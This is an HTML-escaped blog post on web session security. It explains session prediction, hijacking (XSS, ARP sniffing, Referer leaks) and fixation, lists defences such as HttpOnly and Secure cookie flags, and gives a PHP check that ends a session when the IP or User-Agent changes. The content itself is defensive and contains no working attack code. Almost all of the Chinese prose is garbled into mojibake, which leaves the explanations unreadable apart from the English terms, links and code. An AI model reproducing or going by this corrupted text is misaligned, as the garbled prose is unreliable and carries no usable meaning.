&lt;p&gt;Â§ßÂÆ∂ÈÇÑË®òÂæóÂõõÊúà‰ªΩÁöÑ &lt;a href=&quot;https://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;OpenSSL Heartbleed&lt;/a&gt; ‰∫ã‰ª∂ÂóéÔºüÁï∂ÊôÇÈô§‰∫ÜÁ∂≤Á´ôÊú¨Ë∫´‰ª•Â§ñÔºåÂèóÂÆ≥ÊúÄÂö¥ÈáçÁöÑÂ∞±Â±¨ VPN Server ‰∫Ü„ÄÇÂúãÂÖßÂ§ñ‰∏çÂ∞ëÈß≠ÂÆ¢‰∏çÁú†‰∏ç‰ºëÂà©Áî® Heartbleed ÊºèÊ¥ûÁ´äÂèñ VPN Server ÁöÑÁÆ°ÁêÜËÄÖ Session CookieÔºåÈÅãÊ∞£Â•ΩÁöÑË©±Â∞±ÂèØ‰ª•Áõ¥Êé•ÁôªÂÖ•Â§ß‰ºÅÊ•≠ÁöÑÂÖßÁ∂≤„ÄÇ&lt;/p&gt;

&lt;p&gt;‰ΩÜÊòØÔºåÂÖ∂ÂØ¶ÈÄôÊ®£ÁöÑÈ¢®Èö™ÊòØÂèØ‰ª•ÈÅøÂÖçÁöÑÔºå‰ªäÂ§©ÊàëÂÄë‰ª•ÈñãÁôºËÄÖÁöÑËßíÂ∫¶‰æÜË´áË´á Session ÁöÑÊîªÊìäËàáÈò≤Ë≠∑„ÄÇ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;‰ªÄÈ∫ºÊòØ-session‰ªÄÈ∫ºÊòØ-cookie&quot;&gt;‰ªÄÈ∫ºÊòØ SessionÔºü‰ªÄÈ∫ºÊòØ CookieÔºü&lt;/h3&gt;

&lt;p&gt;Âú®Ë´á Session ‰πãÂâçÔºåÊàëÂÄëË¶ÅÂÖàÁû≠Ëß£ Cookie„ÄÇ‰Ω†Áü•ÈÅìÁ∂≤Á´ôÊòØÂ¶Ç‰ΩïËæ®Ë≠òÊàëÂÄëÁöÑË∫´‰ªΩÂóéÔºüÁÇ∫‰ªÄÈ∫ºÊàëÂÄëËº∏ÂÖ•ÂÆåÂ∏≥ËôüÂØÜÁ¢º‰πãÂæåÔºåÁ∂≤Á´ôÂ∞±Áü•ÈÅìÊàëÂÄëÊòØË™∞Âë¢ÔºüÂ∞±ÊòØÂà©Áî® Cookie„ÄÇCookie ÊòØÁ∂≤Á´ôÂú®ÁÄèË¶ΩÂô®‰∏≠Â≠òÊîæÁöÑË≥áÊñôÔºåÂÖßÂÆπÂåÖÊã¨‰ΩøÁî®ËÄÖÂú®Á∂≤Á´ô‰∏äÁöÑÂÅèÂ•ΩË®≠ÂÆö„ÄÅÊàñËÄÖÊòØÁôªÂÖ•ÁöÑ Session ID„ÄÇÁ∂≤Á´ôÂà©Áî® Session ID ‰æÜËæ®Ë™çË®™ÂÆ¢ÁöÑË∫´‰ªΩ„ÄÇ&lt;/p&gt;

&lt;p&gt;Cookie Êó¢ÁÑ∂Â≠òÊîæÂú® Client Á´ØÔºåÈÇ£Â∞±ÊúâË¢´Á´äÂèñÁöÑÈ¢®Èö™„ÄÇ‰æãÂ¶ÇÈÄèÈÅé &lt;a href=&quot;https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29&quot;&gt;Cross-Site ScriptingÔºàË∑®Á´ôËÖ≥Êú¨ÊîªÊìäÔºåÂèàÁ®± XSSÔºâ&lt;/a&gt;ÔºåÊîªÊìäËÄÖÂèØ‰ª•ËºïÊòìÁ´äÂèñÂèóÂÆ≥ËÄÖÁöÑ Cookie„ÄÇÂ¶ÇÊûú Cookie Ë¢´ÂÅ∑Ëµ∞‰∫ÜÔºå‰Ω†ÁöÑË∫´‰ªΩÂ∞±Ë¢´Á´äÂèñ‰∫Ü„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÂèØ‰ª•Áî®‰∏ÄÂÄãË≠¨Âñª‰æÜË°®Á§∫Ôºö‰Ω†Âä†ÂÖ•‰∫Ü‰∏ÄÂÄãÁßòÂØÜ‰ø±Ê®ÇÈÉ®ÔºåÂ°´ÂØ´ÂÆåÊúÉÂì°Ë≥áÊñôÂæåÔºåÂæóÂà∞‰∫Ü‰∏ÄÂºµÊúÉÂì°Âç°„ÄÇ‰πãÂæåÂè™Ë¶ÅÊÜëÈÄôÂºµÊúÉÂì°Âç°ÔºåÂ∞±ÂèØ‰ª•ÈÄ≤ÂÖ•ÈÄôÂÄã‰ø±Ê®ÇÈÉ®„ÄÇ‰ΩÜÊòØÈöîÂ§©Ôºå‰Ω†ÁöÑÊúÉÂì°Âç°Êéâ‰∫Ü„ÄÇÊíøËµ∞‰Ω†ÊúÉÂì°Âç°ÁöÑ‰∫∫ÔºåÂ∞±ÂèØ‰ª•Áî®‰Ω†ÁöÑÊúÉÂì°Âç°ÈÄ≤ÂÖ•ÈÄôÂÄãÁßòÂØÜ‰ø±Ê®ÇÈÉ®ÔºåÂõ†ÁÇ∫ÊúÉÂì°Âç°‰∏äÊ≤íÊúâ‰Ω†ÁöÑÁÖßÁâáÊàñÊòØÂÖ∂‰ªñË∂≥‰ª•Ëæ®Ë≠òË∫´ÂàÜÁöÑË≥áË®ä„ÄÇÈÄôÂ∞±ÂÉèÊòØ‰∏ÄÂÄãÊúÉÂì°Á∂≤Á´ôÔºåÊàëÂÄëÁî≥Ë´ã‰∫Ü‰∏ÄÂÄãÂ∏≥ËôüÔºàÂ°´ÂØ´ÊúÉÂì°Ë≥áÊñôÂä†ÂÖ•‰ø±Ê®ÇÈÉ®ÔºâÔºåËº∏ÂÖ•Â∏≥ËôüÂØÜÁ¢ºÁôªÂÖ•‰πãÂæåÔºåÂæóÂà∞‰∏ÄÁµÑ CookieÔºåÂÖ∂‰∏≠Êúâ Session ID ‰æÜËæ®Ë≠ò‰Ω†ÁöÑË∫´ÂàÜÔºàÈÄèÈÅéÊúÉÂì°Âç°‰æÜËæ®Ë≠òË∫´ÂàÜÔºâ„ÄÇ‰ªäÂ§©Â¶ÇÊûú Cookie Ë¢´ÂÅ∑Ëµ∞‰∫ÜÔºàÊúÉÂì°Âç°Ë¢´ÊíøËµ∞‰∫ÜÔºâÔºåÂà•‰∫∫Â∞±ÂèØ‰ª•Áî®‰Ω†ÁöÑÂ∏≥Ëôü‰æÜÁôªÂÖ•Á∂≤Á´ôÔºàÂà•‰∫∫Áî®‰Ω†ÁöÑÊúÉÂì°Âç°ÈÄ≤ÂÖ•‰ø±Ê®ÇÈÉ®Ôºâ„ÄÇ&lt;/p&gt;

&lt;p&gt;Session ÊîªÊìäÊâãÊ≥ïÊúâ‰∏âÁ®ÆÔºö&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ÁåúÊ∏¨ Session ID (Session Prediction)&lt;/li&gt;
  &lt;li&gt;Á´äÂèñ Session ID (Session Hijacking)&lt;/li&gt;
  &lt;li&gt;Âõ∫ÂÆö Session ID (Session Fixation)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ÊàëÂÄë‰ª•‰∏ã‰∏Ä‰∏Ä‰ªãÁ¥π„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;session-prediction-ÁåúÊ∏¨-session-id&quot;&gt;Session Prediction (ÁåúÊ∏¨ Session ID)&lt;/h4&gt;

&lt;p&gt;Session ID Â¶ÇÂêåÊàëÂÄëÂâçÈù¢ÊâÄË™™ÁöÑÔºåÂ∞±Â¶ÇÂêåÊòØÊúÉÂì°Âç°ÁöÑÁ∑®Ëôü„ÄÇÂè™Ë¶ÅÁü•ÈÅì Session IDÔºåÂ∞±ÂèØ‰ª•ÊàêÁÇ∫ÈÄôÂÄã‰ΩøÁî®ËÄÖ„ÄÇÂ¶ÇÊûú Session ID ÁöÑÈï∑Â∫¶„ÄÅË§áÈõúÂ∫¶„ÄÅÈõú‰∫ÇÂ∫¶‰∏çÂ§†ÔºåÂ∞±ËÉΩÂ§†Ë¢´ÊîªÊìäËÄÖÁåúÊ∏¨„ÄÇÊîªÊìäËÄÖÂè™Ë¶ÅÂØ´Á®ãÂºè‰∏çÊñ∑Êö¥ÂäõË®àÁÆó Session IDÔºåÂ∞±ÊúâÊ©üÊúÉÂæóÂà∞ÊúâÊïàÁöÑ Session ID ËÄåÁ´äÂèñ‰ΩøÁî®ËÄÖÂ∏≥Ëôü„ÄÇ&lt;/p&gt;

&lt;p&gt;ÂàÜÊûê Session ID ÁöÑÂ∑•ÂÖ∑ÂèØ‰ª•Áî®‰ª•‰∏ãÂπæÁ®Æ&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Category:OWASP_WebScarab_Project&quot;&gt;OWASP WebScarab&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://lcamtuf.coredump.cx/soft/stompy.tgz&quot;&gt;Stompy&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://portswigger.net/burp/&quot;&gt;Burp Suite&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ËßÄÂØü Session ID ÁöÑ‰∫ÇÊï∏ÂàÜÂ∏ÉÔºåÂèØ‰ª•‰∫ÜËß£ÊòØÂê¶ËÉΩÂ§†Êé®Âá∫Ë¶èÂæã„ÄÅÁåúÊ∏¨ÊúâÊïàÁöÑ Session ID„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-03-session-id-analysis.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-03-session-id-analysis.png&quot; alt=&quot;ÂàÜÊûê Session ID&quot; title=&quot;ÂàÜÊûê Session ID&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ref: &lt;a href=&quot;http://programming4.us/security/3950.aspx&quot;&gt;http://programming4.us/security/3950.aspx&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Èò≤Ë≠∑Êé™ÊñΩ&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;‰ΩøÁî® Session ID ÂàÜÊûêÁ®ãÂºèÈÄ≤Ë°åÂàÜÊûêÔºåË©ï‰º∞ÊòØÂê¶ÁÑ°Ê≥ïË¢´È†êÊ∏¨„ÄÇÂ¶ÇÊûúÊ≤íÊúâ 100% ÁöÑÊääÊè°Ëá™Â∑±Êí∞ÂØ´ÁöÑ Session ID Áî¢ÁîüÊ©üÂà∂ÊòØÂÆâÂÖ®ÁöÑÔºå‰∏çÂ¶®‰ΩøÁî®ÂÖßÂª∫ÁöÑ Session ID Áî¢Áîü functionÔºåÈÄöÂ∏∏ÈÉΩÊúâ‰∏ÄÂÆöÁ®ãÂ∫¶ÁöÑÂÆâÂÖ®„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;session-hijacking-Á´äÂèñ-session-id&quot;&gt;Session Hijacking (Á´äÂèñ Session ID)&lt;/h4&gt;

&lt;p&gt;Á´äÂèñ Session ID ÊòØÊúÄÂ∏∏Ë¶ãÁöÑÊîªÊìäÊâãÊ≥ï„ÄÇÊîªÊìäËÄÖÂèØ‰ª•Âà©Áî®Â§öÁ®ÆÊñπÂºèÁ´äÂèñ Cookie Áç≤Âèñ Session IDÔºö&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Ë∑®Á´ôËÖ≥Êú¨ÊîªÊìä (&lt;a href=&quot;https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29&quot;&gt;Cross-Site Scripting (XSS)&lt;/a&gt;)ÔºöÂà©Áî® XSS ÊºèÊ¥ûÁ´äÂèñ‰ΩøÁî®ËÄÖ Cookie&lt;/li&gt;
  &lt;li&gt;Á∂≤Ë∑ØÁ´äËÅΩÔºö‰ΩøÁî® ARP Spoofing Á≠âÊâãÊ≥ïÁ´äËÅΩÁ∂≤Ë∑ØÂ∞ÅÂåÖÁç≤Âèñ Cookie&lt;/li&gt;
  &lt;li&gt;ÈÄèÈÅé Referer ÂèñÂæóÔºöËã•Á∂≤Á´ôÂÖÅË®± Session ID ‰ΩøÁî® URL ÂÇ≥ÈÅûÔºå‰æøÂèØËÉΩÂæû Referer ÂèñÂæó Session ID&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Á´äÂèñÂà©Áî®ÁöÑÊñπÂºèÂ¶Ç‰∏ãÂúñÔºö&lt;/p&gt;

&lt;p&gt;ÂèóÂÆ≥ËÄÖÂ∑≤Á∂ìÁôªÂÖ•Á∂≤Á´ô‰º∫ÊúçÂô®Ôºå‰∏¶‰∏îÂèñÂæó Session IDÔºåÂú®ÈÄ£Á∑öÈÅéÁ®ã‰∏≠ÊîªÊìäËÄÖÁî®Á´äËÅΩÁöÑÊñπÂºèÁç≤ÂèñÂèóÂÆ≥ËÄÖ Session ID„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-01-session-id-sniffing.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-01-session-id-sniffing.png&quot; alt=&quot;Á´äÂèñ Session ID&quot; title=&quot;Á´äÂèñ Session ID&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÊîªÊìäËÄÖÁõ¥Êé•‰ΩøÁî®Á´äÂèñÂà∞ÁöÑ Session ID ÈÄÅËá≥‰º∫ÊúçÂô®ÔºåÂÅΩÈÄ†ÂèóÂÆ≥ËÄÖË∫´ÂàÜ„ÄÇËã•‰º∫ÊúçÂô®Ê≤íÊúâÊ™¢Êü• Session ID ÁöÑ‰ΩøÁî®ËÄÖË∫´ÂàÜÔºåÂâáÂèØ‰ª•ËÆìÊîªÊìäËÄÖÂæóÈÄû„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-02-session-id-spoofing.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-02-session-id-spoofing.png&quot; alt=&quot;ÂÅΩÈÄ† Session ID&quot; title=&quot;ÂÅΩÈÄ† Session ID&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Èò≤Ë≠∑Êé™ÊñΩ&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Á¶ÅÊ≠¢Â∞á Session ID ‰ΩøÁî® URL (GET) ÊñπÂºè‰æÜÂÇ≥ÈÅû&lt;/li&gt;
  &lt;li&gt;Ë®≠ÂÆöÂä†Âº∑ÂÆâÂÖ®ÊÄßÁöÑ Cookie Â±¨ÊÄßÔºöHttpOnly (ÁÑ°Ê≥ïË¢´ JavaScript Â≠òÂèñ)&lt;/li&gt;
  &lt;li&gt;Ë®≠ÂÆöÂä†Âº∑ÂÆâÂÖ®ÊÄßÁöÑ Cookie Â±¨ÊÄßÔºöSecure (Âè™Âú® HTTPS ÂÇ≥ÈÅûÔºåËã•Á∂≤Á´ôÁÑ° HTTPS Ë´ãÂãøË®≠ÂÆö)&lt;/li&gt;
  &lt;li&gt;Âú®ÈúÄË¶ÅÊ¨äÈôêÁöÑÈ†ÅÈù¢Ë´ã‰ΩøÁî®ËÄÖÈáçÊñ∞Ëº∏ÂÖ•ÂØÜÁ¢º&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;session-fixation-Âõ∫ÂÆö-session-id&quot;&gt;Session Fixation (Âõ∫ÂÆö Session ID)&lt;/h4&gt;

&lt;p&gt;ÊîªÊìäËÄÖË™ò‰ΩøÂèóÂÆ≥ËÄÖ‰ΩøÁî®ÁâπÂÆöÁöÑ Session ID ÁôªÂÖ•Á∂≤Á´ôÔºåËÄåÊîªÊìäËÄÖÂ∞±ËÉΩÂèñÂæóÂèóÂÆ≥ËÄÖÁöÑË∫´ÂàÜ„ÄÇ&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ÊîªÊìäËÄÖÂæûÁ∂≤Á´ôÂèñÂæóÊúâÊïà Session ID&lt;/li&gt;
  &lt;li&gt;‰ΩøÁî®Á§æ‰∫§Â∑•Á®ãÁ≠âÊâãÊ≥ïË™ò‰ΩøÂèóÂÆ≥ËÄÖÈªûÈÅ∏ÈÄ£ÁµêÔºå‰ΩøÁî®Ë©≤ Session ID ÁôªÂÖ•Á∂≤Á´ô&lt;/li&gt;
  &lt;li&gt;ÂèóÂÆ≥ËÄÖËº∏ÂÖ•Â∏≥ËôüÂØÜÁ¢ºÊàêÂäüÁôªÂÖ•Á∂≤Á´ô&lt;/li&gt;
  &lt;li&gt;ÊîªÊìäËÄÖ‰ΩøÁî®Ë©≤ Session IDÔºåÊìç‰ΩúÂèóÂÆ≥ËÄÖÁöÑÂ∏≥Ëôü&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-04-session-id-fixation.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-04-session-id-fixation.png&quot; alt=&quot;Session Fixation&quot; title=&quot;Session Fixation&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Èò≤Ë≠∑Êé™ÊñΩ&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Âú®‰ΩøÁî®ËÄÖÁôªÂÖ•ÊàêÂäüÂæåÔºåÁ´ãÂç≥Êõ¥Êèõ Session IDÔºåÈò≤Ê≠¢ÊîªÊìäËÄÖÊìçÊéß Session ID Áµ¶‰∫àÂèóÂÆ≥ËÄÖ„ÄÇ&lt;/li&gt;
  &lt;li&gt;Á¶ÅÊ≠¢Â∞á Session ID ‰ΩøÁî® URL (GET) ÊñπÂºè‰æÜÂÇ≥ÈÅû&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;session-Èò≤Ë≠∑&quot;&gt;Session Èò≤Ë≠∑&lt;/h3&gt;

&lt;p&gt;ÈÇ£Ë¶ÅÊÄéÈ∫ºÈò≤ÁØÑÊîªÊìäÂë¢ÔºüÁï∂ÁÑ∂ÊúÉÊúâ‰∫∫Ë™™ÔºåÊúÉÂì°Âç°‰∏çË¶ÅÊéâ‰∏çÂ∞±Ê≤í‰∫ã‰∫ÜÂóéÔºüÁï∂ÁÑ∂ÊàëÂÄëÊ≤íËæ¶Ê≥ïÁ¢∫‰øùÁî®Êà∂‰∏çÊúÉÂõ†ÁÇ∫ÂêÑÁ®ÆÊñπÂºèÂ∞éËá¥ Cookie ÈÅ≠Á´äÔºàXSS„ÄÅÊÉ°ÊÑèÁ®ãÂºèÁ≠âÔºâÔºåÂõ†Ê≠§ÊúÄÂæå‰∏ÄÈÅìÈò≤Á∑öÂ∞±ÊòØÁ∂≤Á´ôÁöÑ Session ‰øùË≠∑„ÄÇ‰∏ÄÂºµÊúÉÂì°Âç°‰∏äÂ¶ÇÊûúÊ≤íÊúâ‰ªª‰ΩïÂèØË≠òÂà•ÁöÑÂÄã‰∫∫Ë≥áÊñôÔºåÁï∂ÁÑ∂‰ªª‰Ωï‰∫∫ÊíøÂéª‰∫ÜÈÉΩÂèØ‰ª•Áî®„ÄÇÂ¶ÇÊûú‰∏äÈù¢ÊúâÁÖßÁâáË∑üÁ∞ΩÂêçÂë¢ÔºüÂÅ∑Ëµ∞ÊúÉÂì°Âç°ÁöÑ‰∫∫Âú®ÈÄ≤ÂÖ•‰ø±Ê®ÇÈÉ®ÁöÑÊôÇÂÄôÔºåÂú®ÈñÄÂè£Â∞±ÊúÉÂõ†ÁÇ∫ÁÖßÁâáË∑üÊú¨‰∫∫‰∏çÁ¨¶ËÄåË¢´Êìã‰∏ã‰æÜ„ÄÇSession ‰øùË≠∑‰πüÊòØ‰∏ÄÊ®£ÔºåÊÄéÈ∫ºËÆìÊàëÂÄëÁöÑ Session ‰øùË≠∑Ê©üÂà∂‰πüËÉΩËæ®Ë≠òË∫´ÂàÜÂë¢ÔºüÁ≠îÊ°àÊòØÂà©Áî®ÊØèÂÄã‰ΩøÁî®ËÄÖÁâπÊúâÁöÑË≠òÂà•Ë≥áË®ä„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊØèÂÄã‰ΩøÁî®ËÄÖÂú®ÁôªÂÖ•Á∂≤Á´ôÁöÑÊôÇÂÄôÔºåÊàëÂÄëÂèØ‰ª•Áî®ÊØèÂÄã‰∫∫ÁâπÊúâÁöÑË≠òÂà•Ë≥áË®ä‰æÜÁ¢∫Ë™çË∫´ÂàÜÔºö&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;‰æÜÊ∫ê IP ‰ΩçÂùÄ&lt;/li&gt;
  &lt;li&gt;ÁÄèË¶ΩÂô® User-Agent&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Â¶ÇÊûúÂú®Âêå‰∏ÄÂÄã Session ‰∏≠Ôºå‰ΩøÁî®ËÄÖÁöÑ IP ÊàñËÄÖ User-Agent ÊîπËÆä‰∫ÜÔºåÊúÄÂÆâÂÖ®ÁöÑ‰ΩúÊ≥ïÂ∞±ÊòØÊääÈÄôÂÄã Session Ê∏ÖÈô§ÔºåË´ã‰ΩøÁî®ËÄÖÈáçÊñ∞ÁôªÂÖ•„ÄÇÈõñÁÑ∂‰ΩøÁî®ËÄÖÂèØËÉΩÂõ†ÁÇ∫ IP Êõ¥Êèõ„ÄÅProxy Á≠âÂõ†Á¥†Â∞éËá¥Ë¢´Âº∑Âà∂ÁôªÂá∫Ôºå‰ΩÜÁÇ∫‰∫ÜÂÆâÂÖ®ÊÄßÔºå‰æøÂà©ÊÄßÂøÖÈ†àË¶ÅËàá‰πãÂèñÊç®„ÄÇ‰ª• PHP ÁÇ∫‰æãÔºåÊàëÂÄëÂèØ‰ª•ÈÄôÊ®£Êí∞ÂØ´Ôºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;REMOTE_ADDR&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;LAST_REMOTE_ADDR&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;HTTP_USER_AGENT&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;LAST_USER_AGENT&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;nb&quot;&gt;session_destroy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;session_regenerate_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;LAST_REMOTE_ADDR&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;REMOTE_ADDR&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;LAST_USER_AGENT&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;HTTP_USER_AGENT&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Èô§‰∫ÜÊ™¢Êü•ÂÄã‰∫∫Ë≠òÂà•Ë≥áË®ä‰æÜÁ¢∫Ë™çÊòØÂê¶ÁõúÁî®‰πãÂ§ñÔºå‰πüÂèØ‰ª•Â¢ûÂä†ÂâçËø∞ÁöÑ Session ID ÁöÑÈò≤Ë≠∑ÊñπÂºèÔºö&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Cookie Ë®≠ÂÆö Secure Flag (HTTPS)&lt;/li&gt;
  &lt;li&gt;Cookie Ë®≠ÂÆö HTTP Only Flag&lt;/li&gt;
  &lt;li&gt;ÊàêÂäüÁôªÂÖ•ÂæåÁ´ãÂç≥ËÆäÊõ¥ Session ID&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Session ÁöÑÊ∏ÖÈô§Ê©üÂà∂‰πüÈùûÂ∏∏ÈáçË¶Å„ÄÇÁï∂‰º∫ÊúçÂô®ÂÅµÊ∏¨Âà∞ÂèØÁñëÁöÑ‰ΩøÁî®ËÄÖ Session Ë°åÁÇ∫ÊôÇÔºå‰æãÂ¶ÇÊîªÊìäËÄÖÊÉ°ÊÑèÂòóË©¶ÂÅΩÈÄ† Session ID„ÄÅ‰ΩøÁî®ËÄÖ Session ÂèØËÉΩÈÅ≠Á´ä„ÄÅÊàñËÄÖÈÄæÊôÇÁ≠âÊÉÖÊ≥ÅÔºåÈÉΩÊáâË©≤Á´ãÂàªÊ∏ÖÈô§Ë©≤ Session ID ‰ª•ÂÖçË¢´ÊîªÊìäËÄÖÂà©Áî®„ÄÇ&lt;/p&gt;

&lt;p&gt;Session Ê∏ÖÈô§Ê©üÂà∂ÊôÇÊ©üÔºö&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ÂÅµÊ∏¨Âà∞ÊÉ°ÊÑèÂòóË©¶ Session ID&lt;/li&gt;
  &lt;li&gt;Ë≠òÂà•Ë≥áË®äÁÑ°ÊïàÊôÇ&lt;/li&gt;
  &lt;li&gt;ÈÄæÊôÇ&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;ÁÆ°ÁêÜËÄÖÊúâÈÅøÂÖç‰ΩøÁî®ËÄÖÂ∏≥ËôüÈÅ≠Á´äÁöÑË≤¨‰ªª&quot;&gt;ÁÆ°ÁêÜËÄÖÊúâÈÅøÂÖç‰ΩøÁî®ËÄÖÂ∏≥ËôüÈÅ≠Á´äÁöÑË≤¨‰ªª&lt;/h3&gt;

&lt;p&gt;‰ΩøÁî®ËÄÖÂ∏≥ËôüÈÅ≠Á´ä‰∏ÄÁõ¥‰ª•‰æÜÈÉΩÊòØÈ°ØËëóÁöÑÂïèÈ°åÔºå‰ΩÜÂçªÈÆÆÂ∞ëÊúâÁ∂≤Á´ôÈáùÂ∞ç Session ÁöÑÊ©üÂà∂ÈÄ≤Ë°å‰øùË≠∑„ÄÇÊîªÊìäËÄÖÂèØ‰ª•ËºïÈ¨Ü‰ΩøÁî® &lt;a href=&quot;http://codebutler.github.io/firesheep/&quot;&gt;firesheep&lt;/a&gt; ‰πãÈ°ûÁöÑÂ∑•ÂÖ∑Á´äÂèñÂ∏≥Ëôü„ÄÇÂúãÂ§ñÂ∑≤Á∂ìÊúâ‰∏çÂ∞ëÁ∂≤Á´ôÂÅµÊ∏¨Âà∞ Session ÂèØËÉΩÈÅ≠Á´äÊôÇÂ∞áÂ∏≥ËôüÂº∑Âà∂ÁôªÂá∫Ôºå‰ΩÜÂúãÂÖßÁõÆÂâçÈÇÑÈÆÆÂ∞ëÁ∂≤Á´ôÂØ¶‰ΩúÊ≠§Èò≤Á¶¶ÔºåË®≠ÂÇôÂïÜÁöÑ Web ÁÆ°ÁêÜ‰ªãÈù¢Êõ¥Â∞ëÈáùÂ∞ç Session ÈÄ≤Ë°å‰øùË≠∑„ÄÇÂ¶ÇÊûú VPN Server Á≠âË®≠ÂÇôÊúâÂÅµÊ∏¨ Session ID ÁöÑÂÅΩÈÄ†ÔºåÂú® &lt;a href=&quot;http://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect/&quot;&gt;OpenSSL Heartbleed&lt;/a&gt; ‰∫ã‰ª∂ÊôÇÂ∞±‰∏çÊúÉÊúâÈÇ£È∫ºÊÖòÈáçÁöÑÊêçÂ§±‰∫Ü„ÄÇ&lt;/p&gt;

